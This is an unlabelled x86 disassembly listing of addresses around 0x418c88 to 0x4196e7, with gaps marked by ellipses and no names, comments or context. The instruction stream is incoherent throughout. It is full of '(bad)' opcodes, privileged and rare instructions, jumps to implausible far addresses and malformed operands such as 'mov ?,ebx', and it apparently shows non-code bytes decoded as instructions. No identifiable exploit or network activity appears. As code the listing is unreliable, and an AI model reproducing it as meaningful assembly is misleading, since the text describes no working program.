  418c88:	sbb    edx,ecx
  418c8a:	repz loope 0x418cdf
  418c8d:	xor    al,BYTE PTR [ebx-0x12]
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [edx-0xc],cl
  418d02:	jmp    DWORD PTR [edi]
  418d04:	lods   al,BYTE PTR ds:[esi]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	(bad)  
  418d0d:	cmp    dh,BYTE PTR [ebp-0x5a]
  418d10:	adc    DWORD PTR [eax-0x13a24826],ebx
  418d16:	dec    esi
  418d17:	hlt    
  418d18:	jnp    0x418d6b
  418d1a:	aad    0xa8
  418d1c:	ret    0xa08e
  418d1f:	repz aad 0x99
  418d22:	rcl    BYTE PTR [ecx+eiz*8],cl
  418d25:	jmp    0xe4938ed1
  418d2a:	add    al,0x94
  418d2c:	sbb    edx,DWORD PTR [edx+0x26]
  418d2f:	push   0x49605ef3
  418d34:	add    eax,0x602206f4
  418d39:	loope  0x418d6b
  418d3b:	or     al,0x7b
  418d3d:	sbb    DWORD PTR [ebp-0x72897c3d],esp
  418d43:	jg     0x418d77
  418d45:	add    BYTE PTR [eax+ebx*1],al
  418d48:	adc    ebx,ebp
  418d4a:	loop   0x418d0b
  418d4c:	xchg   edi,eax
  418d4d:	lods   eax,DWORD PTR ds:[esi]
  418d4e:	and    dh,dl
  418d50:	adc    edx,edi
  418d52:	cdq    
  418d53:	sub    cl,BYTE PTR [ecx+0x29]
  418d56:	jno    0x418d2e
  418d58:	jae    0x418d3a
  418d5a:	lock sub ebx,esi
  418d5d:	push   es
  418d5e:	jno    0x418cf6
  418d60:	imul   ecx,ebx,0xffffffaa
  418d63:	adc    al,0x14
  418d65:	xchg   esi,eax
  418d66:	ins    BYTE PTR es:[edi],dx
  418d67:	(bad)  
  418d68:	inc    esi
  418d69:	outs   dx,BYTE PTR ds:[esi]
  418d6a:	jae    0x418d38
  418d6c:	loope  0x418d83
  418d6e:	test   DWORD PTR [ecx],ecx
  418d70:	pop    esp
  418d71:	cmp    ch,BYTE PTR [ebx+0x57d878e1]
  418d77:	clc    
  418d78:	stos   DWORD PTR es:[edi],eax
  418d79:	(bad)  
  418d7a:	jmp    0x418d64
  418d7c:	stos   BYTE PTR es:[edi],al
  418d7d:	outs   dx,BYTE PTR ds:[esi]
  418d7e:	push   eax
  418d7f:	lahf   
  418d80:	xchg   BYTE PTR [esi-0x80],dh
  418d83:	cmp    eax,0x6a76d61
  418d88:	adc    dl,0x95
  418d8b:	cdq    
  418d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d8d:	xchg   ebx,eax
  418d8e:	neg    BYTE PTR [ebp+edx*8+0x7181f1a4]
  418d95:	jo     0x418d2d
  418d97:	dec    eax
  418d98:	pop    ecx
  418d99:	pushf  
  418d9a:	inc    ecx
  418d9b:	sbb    DWORD PTR [ecx+0x49af6de5],ebx
  418da1:	test   eax,0x42f5117e
  418da6:	or     DWORD PTR [esi-0x16],ebp
  418da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418daa:	push   ebp
  418dab:	and    DWORD PTR [ecx+eax*8-0x48],0xb59de356
  418db3:	inc    ebp
  418db4:	popa   
  418db5:	(bad)  
  418db6:	or     dl,BYTE PTR [ebx+0x29]
  418db9:	and    edx,DWORD PTR ds:0x21bc2c67
  418dbf:	adc    al,BYTE PTR [eax+0x7aa9cfd0]
  418dc5:	mov    dl,0xd0
  418dc7:	stos   DWORD PTR es:[edi],eax
  418dc8:	ret    
  418dc9:	das    
  418dca:	dec    esp
  418dcb:	neg    BYTE PTR [esi+0x30]
  418dce:	pusha  
  418dcf:	push   0x6bd763ae
  418dd4:	or     dl,cl
  418dd6:	jb     0x418e0f
  418dd8:	aas    
  418dd9:	mov    fs,edi
  418ddb:	jecxz  0x418dea
  418ddd:	stc    
  418dde:	pop    ds
  418ddf:	addr16 or al,0x71
  418de2:	push   ecx
  418de3:	pop    eax
  418de4:	or     eax,0xa5627c5f
  418de9:	gs jo  0x418db1
  418dec:	sub    bh,al
  418dee:	cmp    al,0x5f
  418df0:	mov    ds:0x10493bd5,al
  418df5:	fs ret 
  418df7:	stos   BYTE PTR es:[edi],al
  418df8:	and    dl,BYTE PTR [eax]
  418dfa:	ret    
  418dfb:	and    ch,al
  418dfd:	nop
  418dfe:	xchg   edx,eax
  418dff:	sbb    bl,cl
  418e01:	push   ebx
  418e02:	icebp  
  418e03:	fucomip st,st(7)
  418e05:	add    ebx,ecx
  418e07:	ret    0xb2d6
  418e0a:	sub    BYTE PTR [edx],dh
  418e0c:	outs   dx,BYTE PTR ds:[esi]
  418e0d:	xchg   edi,eax
  418e0e:	cmp    BYTE PTR [ebx+0x0],bl
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x3f]
  418e81:	push   ebx
  418e82:	push   esi
  418e83:	adc    DWORD PTR [eax+0x4000107],esi
  418e89:	add    DWORD PTR [eax],eax
  418e8b:	add    BYTE PTR [ecx],cl
  418e8d:	stos   BYTE PTR es:[edi],al
  418e8e:	jno    0x418e4b
  418e90:	daa    
  418e91:	shl    BYTE PTR [esi+eiz*2+0x1a],cl
  418e95:	fstp   DWORD PTR [edx]
  418e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e98:	push   es
  418e99:	lods   al,BYTE PTR ds:[esi]
  418e9a:	mov    BYTE PTR [ebp-0x358c4d46],al
  418ea0:	push   DWORD PTR [eax-0x64]
  418ea3:	out    dx,al
  418ea4:	sbb    DWORD PTR [esi-0x291abd20],eax
  418eaa:	and    al,BYTE PTR [esi+0x55]
  418ead:	mov    bl,0x8a
  418eaf:	aam    0x96
  418eb1:	pop    ds
  418eb2:	icebp  
  418eb3:	jbe    0x418ea6
  418eb5:	mov    ebx,0x24dd44ca
  418eba:	ja     0x418ec0
  418ebc:	aaa    
  418ebd:	mov    esp,0xa4b8081b
  418ec2:	or     BYTE PTR [ecx-0x2d402468],dl
  418ec8:	shr    DWORD PTR [ebx-0x16],0x77
  418ecc:	loope  0x418e66
  418ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ecf:	sbb    al,0x93
  418ed1:	sub    eax,0x961c0357
  418ed6:	mov    al,0xea
  418ed8:	xchg   eax,eax
  418eda:	sbb    ecx,0xa176caec
  418ee0:	ss iret 
  418ee2:	fs mov ecx,0x9f3de45b
  418ee8:	(bad)  
  418ee9:	sbb    al,0xd7
  418eeb:	push   es
  418eec:	mov    BYTE PTR [eax],bh
  418eee:	jnp    0x418f33
  418ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef1:	or     dh,dh
  418ef3:	sar    BYTE PTR [ecx],1
  418ef5:	jmp    FWORD PTR [ecx+ecx*8+0x73]
  418ef9:	sub    DWORD PTR [eax+0x3695ca19],ecx
  418eff:	mov    ?,ebx
  418f01:	iret   
  418f02:	adc    BYTE PTR [ebx-0x607acf86],cl
  418f08:	mov    ds:0x922cfc3a,al
  418f0d:	jmp    0x418f6a
  418f0f:	mov    dl,0xd3
  418f11:	push   cs
  418f12:	xchg   ebp,eax
  418f13:	fdiv   st,st(2)
  418f15:	mov    eax,0x19aaa0db
  418f1a:	(bad)  
  418f1c:	push   0xffffff87
  418f1e:	pop    ds
  418f1f:	dec    edi
  418f20:	(bad)  
  418f21:	popa   
  418f22:	cli    
  418f23:	jmp    0x58c9e2d4
  418f28:	je     0x418f25
  418f2a:	jnp    0x418f29
  418f2c:	adc    eax,0xf6d2aec8
  418f31:	mov    edi,DWORD PTR [edi]
  418f33:	push   esi
  418f34:	pop    ebx
  418f35:	jle    0x418f79
  418f37:	fcmove st,st(1)
  418f39:	ins    BYTE PTR es:[edi],dx
  418f3a:	inc    esi
  418f3b:	out    dx,al
  418f3c:	pop    ecx
  418f3d:	sbb    eax,0xf53e87d9
  418f42:	in     eax,dx
  418f43:	in     eax,0x54
  418f45:	cdq    
  418f46:	leave  
  418f47:	add    dl,BYTE PTR [edx+ebp*8]
  418f4a:	call   esi
  418f4c:	adc    ebp,DWORD PTR [esi+eax*8]
  418f4f:	imul   esi,DWORD PTR [esi-0x4a],0x9e08d93
  418f56:	fisttp DWORD PTR [ebx]
  418f58:	lock add eax,DWORD PTR [edi-0x51]
  418f5c:	test   DWORD PTR [edi+0x73],ebx
  418f5f:	or     DWORD PTR [eax+ebx*2-0x57],esp
  418f63:	test   DWORD PTR [edi+ebx*2-0x77431082],ecx
  418f6a:	xor    BYTE PTR [ebx],0xb
  418f6d:	xor    ecx,0xffffffad
  418f70:	inc    ebx
  418f71:	dec    ecx
  418f72:	mov    ds:0x68496501,eax
  418f77:	in     al,0xb1
  418f79:	sbb    eax,edx
  418f7b:	xchg   esp,eax
  418f7c:	sbb    DWORD PTR [eax-0x71],esp
  418f7f:	popa   
  418f80:	cdq    
  418f81:	mov    ebx,0xe827de28
  418f86:	sbb    DWORD PTR [edi+0x68191d09],0x864c703e
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0xbeaf1a7]
  419001:	sahf   
  419002:	and    ebp,DWORD PTR [ebx+0x108b4]
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	in     al,dx
  41900d:	and    edi,DWORD PTR [edx+ebp*1]
  419010:	stos   BYTE PTR es:[edi],al
  419011:	add    edx,edx
  419013:	mov    eax,ds:0xd74c5b0a
  419018:	inc    esi
  419019:	push   ds
  41901a:	mov    eax,ds:0x3554ab9c
  41901f:	xor    edi,DWORD PTR [ebp+0x2e]
  419022:	mov    dh,BYTE PTR [ecx-0x1e7831f2]
  419028:	shr    DWORD PTR [esi-0x48b4efeb],cl
  41902e:	mov    dl,0xa7
  419030:	push   es
  419031:	fcomp  DWORD PTR [ebx+0xec645d7]
  419037:	stos   DWORD PTR es:[edi],eax
  419038:	mov    al,ds:0x6595336d
  41903d:	jnp    0x419094
  41903f:	mov    ebx,0xccc96c79
  419044:	test   BYTE PTR [ecx],0x72
  419047:	push   esi
  419048:	inc    ebp
  419049:	lods   al,BYTE PTR ds:[esi]
  41904a:	das    
  41904b:	in     al,0x50
  41904d:	retf   0x1f1c
  419050:	call   0x2a6e:0x5215a8a8
  419057:	ja     0x41902c
  419059:	iret   
  41905a:	push   0x2f382029
  41905f:	pop    es
  419060:	shl    DWORD PTR [esi+0x4979861e],cl
  419066:	ja     0x4190bc
  419068:	ja     0x418fed
  41906a:	sbb    DWORD PTR [ebp-0x3f],esi
  41906d:	mov    DWORD PTR [ecx-0x16],ebx
  419070:	mov    dl,0x45
  419072:	sbb    DWORD PTR [eax+0x2b5cc02e],ebx
  419078:	sbb    DWORD PTR [ebx-0x7a],ebp
  41907b:	shr    BYTE PTR [ecx+0xe8dc92c],1
  419081:	push   ebp
  419082:	lock jge 0x419068
  419085:	pop    ds
  419086:	add    al,0x1b
  419088:	xor    bh,BYTE PTR [eax+0x6e]
  41908b:	jbe    0x419101
  41908d:	aas    
  41908e:	ret    0x2350
  419091:	fimul  WORD PTR [esi+ebp*2-0x40ab8dbc]
  419098:	std    
  419099:	inc    edx
  41909a:	cmp    cl,BYTE PTR [ecx-0x40]
  41909d:	sahf   
  41909e:	sbb    BYTE PTR ss:[esi],ch
  4190a1:	cmp    dh,BYTE PTR [ecx-0x5dce9e9c]
  4190a7:	ret    0x6e61
  4190aa:	jnp    0x4190d0
  4190ac:	lods   eax,DWORD PTR ds:[esi]
  4190ad:	rcl    BYTE PTR [edx+0x2d],0xc5
  4190b1:	dec    esi
  4190b2:	inc    edx
  4190b3:	or     eax,0xd32235a
  4190b8:	jnp    0x419050
  4190ba:	mov    dh,0x1d
  4190bc:	lds    esp,FWORD PTR [edx-0x33]
  4190bf:	jmp    0x998474e7
  4190c4:	mov    es,eax
  4190c6:	nop
  4190c7:	dec    esp
  4190c8:	add    DWORD PTR [eax-0x2b],esp
  4190cb:	sbb    esi,DWORD PTR [ebp-0x18]
  4190ce:	jns    0x41912c
  4190d0:	xchg   esp,eax
  4190d1:	repz cdq 
  4190d3:	outs   dx,DWORD PTR ds:[esi]
  4190d4:	(bad)  
  4190d5:	repnz or esp,DWORD PTR [edx-0x62]
  4190d9:	cmp    BYTE PTR [esi],0x80
  4190dc:	push   esp
  4190dd:	pop    edi
  4190de:	retf   0xa3a5
  4190e1:	mov    bl,0xbd
  4190e3:	push   ss
  4190e4:	inc    edx
  4190e5:	push   ss
  4190e6:	fs call ebx
  4190e9:	jo     0x4190ab
  4190eb:	xchg   edx,eax
  4190ec:	mov    dl,0x30
  4190ee:	push   edi
  4190ef:	jo     0x419083
  4190f1:	test   eax,0xb5e369e0
  4190f6:	cmp    eax,0x1c4261d7
  4190fb:	cld    
  4190fc:	imul   edi,DWORD PTR [edx+eiz*8+0x12e8b16],0xc2958a24
  419107:	jnp    0x4190ec
  419109:	loopne 0x41914b
  41910b:	lock fcomi st,st(2)
  41910e:	into   
  41910f:	call   0x419114
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,BYTE PTR [ecx-0x4c]
  419182:	mov    BYTE PTR [eax+edi*4+0x4000109],al
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    dh,dh
  41918d:	(bad)  
  41918e:	fwait
  41918f:	xchg   DWORD PTR [eax-0x1231981e],edi
  419195:	aam    0xf
  419197:	sbb    BYTE PTR [ebp-0x76],dl
  41919a:	into   
  41919b:	xchg   esi,eax
  41919c:	mov    ebx,0x43292d8b
  4191a1:	mov    esi,0x8354ecbd
  4191a6:	adc    dh,BYTE PTR [edi+eiz*2]
  4191a9:	and    DWORD PTR [ebp+0x2d],esp
  4191ac:	mov    al,ds:0xa59811a
  4191b1:	aas    
  4191b2:	stc    
  4191b3:	enter  0xdcd9,0xca
  4191b7:	mov    ds:0x2592e3a9,al
  4191bc:	inc    esi
  4191bd:	jb     0x41921d
  4191bf:	inc    ecx
  4191c0:	add    edx,ebp
  4191c2:	dec    BYTE PTR [esi]
  4191c4:	int3   
  4191c5:	fs pop ds
  4191c7:	pop    ss
  4191c8:	call   0x323a:0xb2aa0923
  4191cf:	inc    esp
  4191d0:	out    0x94,al
  4191d2:	ins    BYTE PTR es:[edi],dx
  4191d3:	loop   0x41918e
  4191d5:	(bad)  
  4191d7:	adc    BYTE PTR [esi],dh
  4191d9:	jl     0x419186
  4191db:	bound  edi,QWORD PTR gs:[esi-0x63]
  4191df:	or     BYTE PTR [ebp+ebx*4+0x43],bh
  4191e3:	(bad)  
  4191e4:	jnp    0x419234
  4191e6:	test   DWORD PTR [ebp-0x69],0x9d1b948c
  4191ed:	test   BYTE PTR [ebx+0x29],bl
  4191f0:	inc    ebp
  4191f1:	mov    dl,dh
  4191f3:	pop    ebp
  4191f4:	mov    esi,0x284cc8b7
  4191f9:	rol    DWORD PTR [esi+0x4a410ed],1
  4191ff:	pop    edi
  419200:	(bad)  
  419202:	(bad)  
  419203:	pop    ds
  419204:	push   ebp
  419205:	jns    0x41920b
  419207:	mov    ch,0x4e
  419209:	jne    0x4191cb
  41920b:	mov    esp,0xee52e820
  419210:	pop    es
  419211:	mov    ebx,0xbb254e9c
  419216:	adc    eax,0x1f614a0c
  41921b:	ficomp WORD PTR [ebp+0x29]
  41921e:	mov    bh,0xfc
  419220:	mov    ecx,0xe4dc7ff4
  419225:	sub    BYTE PTR [ecx+0x6b],0xbe
  419229:	jl     0x419299
  41922b:	cmc    
  41922c:	sub    edx,edi
  41922e:	addr16 cmp eax,0x98a84e8c
  419234:	cdq    
  419235:	aaa    
  419236:	test   BYTE PTR [ebp+0x5d],bl
  419239:	jb     0x419295
  41923b:	mov    ch,0x56
  41923d:	lods   al,BYTE PTR ds:[esi]
  41923e:	jg     0x4192a6
  419240:	cmp    edi,DWORD PTR [esp+eiz*8]
  419243:	xor    DWORD PTR [edx+0x1cb28c2f],esp
  419249:	xlat   BYTE PTR ds:[ebx]
  41924a:	shr    ebp,cl
  41924c:	mov    cs,WORD PTR [edi]
  41924e:	adc    eax,0xf15bdecc
  419253:	adc    eax,0x25fd827d
  419258:	lods   eax,DWORD PTR ds:[esi]
  419259:	mov    esp,0xf312b139
  41925e:	repz (bad) 
  419260:	retf   
  419261:	dec    esi
  419262:	mov    edx,DWORD PTR [edx-0x63d9edb5]
  419268:	xlat   BYTE PTR ds:[ebx]
  419269:	xor    DWORD PTR [ebx+eax*8-0x9],0xffffffc4
  41926e:	cmp    eax,0xe015349c
  419273:	retf   0xd287
  419276:	clc    
  419277:	mov    dh,0x61
  419279:	xchg   ebp,eax
  41927a:	jo     0x41920d
  41927c:	loopne 0x419227
  41927e:	xrelease mov BYTE PTR gs:[eax],bl
  419282:	mov    esi,edi
  419284:	cli    
  419285:	and    BYTE PTR [ecx],al
  419287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419288:	lahf   
  419289:	lea    esp,[edi+0x78]
  41928c:	lea    edi,[ebx+0x1c]
  41928f:	mov    edi,0x0
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	nop
  419301:	xchg   edi,eax
  419302:	inc    ebp
  419303:	pop    ds
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [esi+eax*2+0x75],dh
  41930f:	jl     0x4192cd
  419311:	into   
  419312:	lods   eax,DWORD PTR ds:[esi]
  419313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419314:	sti    
  419315:	idiv   DWORD PTR [edx+ecx*1-0x21]
  419319:	adc    BYTE PTR [esi+0x72b56ce4],al
  41931f:	sub    edi,esp
  419321:	adc    ebx,DWORD PTR cs:[esp+eiz*4+0x5f4fa2fa]
  419329:	push   ss
  41932a:	xchg   esi,eax
  41932b:	mov    esp,0xda779ec7
  419330:	lods   eax,DWORD PTR ds:[esi]
  419331:	les    eax,FWORD PTR [ebp-0x1e]
  419334:	inc    esi
  419335:	mov    WORD PTR [ecx-0x60],fs
  419338:	enter  0x92d8,0xc6
  41933c:	inc    edx
  41933d:	mov    bh,0x4
  41933f:	(bad)
  419343:	in     al,0x6e
  419345:	stos   BYTE PTR es:[edi],al
  419346:	loop   0x419320
  419348:	jg     0x41932a
  41934a:	dec    eax
  41934b:	test   eax,0x55a5c179
  419350:	mov    esi,0x924ac142
  419355:	test   DWORD PTR [ecx+esi*1+0x1eec7b58],esi
  41935c:	repz sub al,0xb0
  41935f:	adc    edx,esi
  419361:	ss aas 
  419363:	jb     0x41939f
  419365:	mov    BYTE PTR [esi+0x2f],0x25
  419369:	jmp    0xe53:0xcf8639c
  419370:	outs   dx,DWORD PTR ds:[esi]
  419371:	push   cs
  419372:	out    dx,al
  419373:	pusha  
  419374:	sbb    al,0x2f
  419376:	es inc edx
  419378:	mov    al,0x4a
  41937a:	push   cs
  41937b:	adc    BYTE PTR [edx+0x4d],0x2d
  41937f:	sar    BYTE PTR [ebx],cl
  419381:	push   edx
  419382:	cmp    ebp,DWORD PTR [ecx-0x1842721c]
  419388:	mov    bl,0x16
  41938a:	dec    esp
  41938b:	inc    eax
  41938c:	push   ss
  41938d:	test   eax,0x3bf5b25d
  419392:	stos   DWORD PTR es:[edi],eax
  419393:	inc    esi
  419394:	hlt    
  419395:	retf   0xc482
  419398:	sbb    al,0x35
  41939a:	dec    ebp
  41939b:	cmp    ah,al
  41939d:	cwde   
  41939e:	(bad)  
  41939f:	sub    al,0x10
  4193a1:	shl    DWORD PTR [edi],0xcd
  4193a4:	sti    
  4193a5:	mov    edx,0x72d5109e
  4193aa:	push   esp
  4193ab:	test   BYTE PTR [eax+0x11],bl
  4193ae:	xor    ch,BYTE PTR [esi+0xb9323fe]
  4193b4:	mov    BYTE PTR [edi],bl
  4193b6:	mov    al,ds:0xcf1c1f9d
  4193bb:	jl     0x4193e1
  4193bd:	ror    esi,cl
  4193bf:	das    
  4193c0:	shl    ch,1
  4193c2:	jg     0x41935a
  4193c4:	stos   BYTE PTR es:[edi],al
  4193c5:	ds inc eax
  4193c7:	rcl    BYTE PTR [edx],cl
  4193c9:	cli    
  4193ca:	mov    ecx,0x405563ef
  4193cf:	mov    al,ds:0x3add573a
  4193d4:	mov    ebx,0x9e48eedf
  4193d9:	pushf  
  4193da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193db:	fdivr  QWORD PTR [edi]
  4193dd:	inc    ebx
  4193de:	xchg   edi,eax
  4193df:	and    dh,BYTE PTR [ebp-0x4f]
  4193e2:	inc    edi
  4193e3:	es inc ebp
  4193e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193e6:	(bad)  
  4193e8:	scas   al,BYTE PTR es:[edi]
  4193e9:	gs push 0x5e
  4193ec:	push   eax
  4193ed:	mov    ecx,0x7cd7fb4e
  4193f2:	jne    0x419430
  4193f4:	mul    al
  4193f6:	shl    DWORD PTR [edi+0x3c633802],cl
  4193fc:	cli    
  4193fd:	cmp    DWORD PTR [ecx],ebx
  4193ff:	stos   DWORD PTR es:[edi],eax
  419400:	test   BYTE PTR [ebx+0x2d],dl
  419403:	int3   
  419404:	mov    cl,0xee
  419406:	fisttp QWORD PTR [esi+edi*4-0x16]
  41940a:	sub    eax,0xd2fd79de
  41940f:	test   eax,0x0
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	pop    esi
  419481:	fs es ja 0x419445
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	dec    esp
  41948d:	out    0xa6,al
  41948f:	add    BYTE PTR [edi+0x7c],0xeb
  419493:	dec    edx
  419494:	in     al,0x89
  419496:	cdq    
  419497:	(bad)  
  419498:	icebp  
  419499:	fwait
  41949a:	mov    DWORD PTR [eax],ecx
  41949c:	test   al,0xec
  41949e:	pop    edx
  41949f:	not    DWORD PTR ds:0x29899316
  4194a5:	push   esp
  4194a6:	push   es
  4194a7:	dec    ebp
  4194a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a9:	jecxz  0x4194f1
  4194ab:	fdivr  DWORD PTR [esi]
  4194ad:	push   ds
  4194ae:	pop    edx
  4194af:	push   ds
  4194b0:	fild   QWORD PTR [ebp+0x3c]
  4194b3:	out    0xe9,eax
  4194b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b7:	hlt    
  4194b8:	push   0x4640fdaf
  4194bd:	es loope 0x419455
  4194c0:	sbb    ebp,ebp
  4194c2:	das    
  4194c3:	mov    eax,ds:0xc6ed174e
  4194c8:	cmp    eax,0xe7df1a28
  4194cd:	inc    edx
  4194ce:	mov    esp,?
  4194d0:	sub    eax,0x173b2c67
  4194d5:	jmp    0x41953f
  4194d7:	add    bh,ch
  4194d9:	fdiv   QWORD PTR [ecx*4-0x35f3332f]
  4194e0:	mov    esi,0xb90f27ed
  4194e5:	pop    edi
  4194e6:	pop    ds
  4194e7:	ret    0x328c
  4194ea:	sub    DWORD PTR [esi-0x3c],0xfffffffe
  4194ee:	push   ebp
  4194ef:	jns    0x4194a6
  4194f1:	add    BYTE PTR [esi],ah
  4194f3:	scas   eax,DWORD PTR es:[edi]
  4194f4:	neg    DWORD PTR [ebp+0x21]
  4194f7:	mov    cl,0xd9
  4194f9:	mov    dh,0xb7
  4194fb:	and    ch,BYTE PTR [esi+esi*4-0x4a72225e]
  419502:	gs ja  0x419560
  419505:	fwait
  419506:	sub    al,0xf6
  419508:	mov    dh,0x8c
  41950a:	mov    ds:0x6217ee15,eax
  41950f:	cmp    BYTE PTR [esi],0x43
  419512:	fmul   QWORD PTR [ebp+0x54]
  419515:	int3   
  419516:	(bad)  
  419517:	fisubr WORD PTR [ecx-0x734766d]
  41951d:	(bad)  
  41951e:	mov    al,ds:0xbf2fb56d
  419523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419524:	lods   eax,DWORD PTR ds:[esi]
  419525:	es scas eax,DWORD PTR es:[edi]
  419527:	mov    al,ds:0x91dc2b4f
  41952c:	call   0x1cdcf548
  419531:	(bad)  
  419532:	repnz and ch,BYTE PTR [edi+ebx*2+0x4]
  419537:	jb     0x4195b4
  419539:	pushf  
  41953a:	lea    esi,ds:0xf56390bf
  419540:	aas    
  419541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419542:	cld    
  419543:	cwde   
  419544:	mov    ecx,0x6bc32569
  419549:	(bad)  
  41954a:	jg     0x41956b
  41954c:	push   ebp
  41954d:	cmp    eax,0xed6ded6b
  419552:	cmp    DWORD PTR [ebx],edx
  419554:	mov    ds:0x7b9f4900,eax
  419559:	in     al,0xa8
  41955b:	xor    al,0xbb
  41955d:	cmp    edi,DWORD PTR [ecx+eiz*8+0x7b4cd5bc]
  419564:	retf   
  419565:	mov    ch,0xf9
  419567:	imul   eax,ebx,0xb7c7f085
  41956d:	aad    0xd
  41956f:	jbe    0x4195d0
  419571:	cdq    
  419572:	xchg   DWORD PTR [edi+edx*4],ecx
  419575:	imul   ebx,DWORD PTR [ecx],0xffffffc8
  419578:	pop    ebx
  419579:	stc    
  41957a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41957b:	ds int3 
  41957d:	rcl    DWORD PTR [ebx+eiz*2+0x3d51f14d],cl
  419584:	int    0x11
  419586:	xor    bh,ah
  419588:	and    al,0x15
  41958a:	mov    WORD PTR [eax+edx*8+0x72],?
  41958e:	test   ch,0x0
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419601:	and    bh,bh
  419603:	xchg   edx,eax
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	fcomp  DWORD PTR [ebp+0x69e39067]
  419612:	jb     0x41959c
  419614:	(bad)
  419617:	(bad)  
  419618:	mov    bl,0xbe
  41961a:	int3   
  41961b:	xor    DWORD PTR [edx-0x7b],ecx
  41961e:	cmp    edx,DWORD PTR [ebx-0x44dd29d6]
  419624:	pop    esi
  419625:	test   ecx,ebp
  419627:	jae    0x419681
  419629:	cmp    esi,eax
  41962b:	pop    esp
  41962c:	xchg   esi,eax
  41962d:	jne    0x4195b3
  41962f:	test   eax,0xf21d5157
  419634:	das    
  419635:	inc    esi
  419636:	shr    DWORD PTR [ebp+0x35],cl
  419639:	std    
  41963a:	push   es
  41963b:	jns    0x41967f
  41963d:	and    esi,DWORD PTR [edi+0x3513a9a3]
  419643:	and    al,0xa3
  419645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419646:	inc    esi
  419647:	in     al,dx
  419648:	dec    ebp
  419649:	sbb    DWORD PTR [esi-0x64211373],0xb61990eb
  419653:	psubsb mm6,QWORD PTR [eax+0x2fd2859c]
  41965a:	data16 jnp 0x4196d2
  41965d:	int    0x83
  41965f:	call   0xc3565277
  419664:	jmp    0xc52a6442
  419669:	cmp    ah,BYTE PTR [edi-0x6dcc8804]
  41966f:	clc    
  419670:	pop    ss
  419671:	ss push esp
  419673:	xchg   edx,eax
  419674:	xchg   DWORD PTR [edi],edi
  419676:	out    dx,al
  419677:	adc    esi,ecx
  419679:	push   eax
  41967a:	adc    ax,0xdcae
  41967e:	je     0x41968c
  419680:	cdq    
  419681:	inc    esp
  419682:	out    0x48,eax
  419684:	shl    BYTE PTR [eax],cl
  419686:	mov    ebp,0x81021c4
  41968b:	xor    eax,0xf9a4a472
  419690:	icebp  
  419691:	or     bl,BYTE PTR [esi+ecx*1]
  419694:	(bad)  
  419695:	sbb    eax,0x31a778e0
  41969a:	call   0x26679b6e
  41969f:	mov    esp,0xdb8f6d17
  4196a4:	mov    ds:0x2264c848,eax
  4196a9:	push   ds
  4196aa:	shl    DWORD PTR [edx-0x4f49eff3],cl
  4196b0:	dec    ebp
  4196b1:	sub    eax,DWORD PTR [edx]
  4196b3:	push   ss
  4196b4:	xchg   edi,eax
  4196b5:	sub    BYTE PTR [ecx+0x2de12475],ch
  4196bb:	scas   eax,DWORD PTR es:[edi]
  4196bc:	pop    esi
  4196bd:	iret   
  4196be:	in     eax,0x93
  4196c0:	cmp    ch,BYTE PTR [ebx-0x69068c21]
  4196c6:	and    bl,BYTE PTR [bp+di+0x6c07]
  4196cb:	cwde   
  4196cc:	out    dx,eax
  4196cd:	or     eax,edx
  4196cf:	or     eax,0xbb465ad4
  4196d4:	ficomp DWORD PTR [esi+edx*1]
  4196d7:	stos   DWORD PTR es:[edi],eax
  4196d8:	sbb    eax,DWORD PTR [ebp-0x4e]
  4196db:	adc    eax,0x5332843
  4196e0:	rol    DWORD PTR [edi+ebx*1-0x3780025b],1
  4196e7:	push   edi
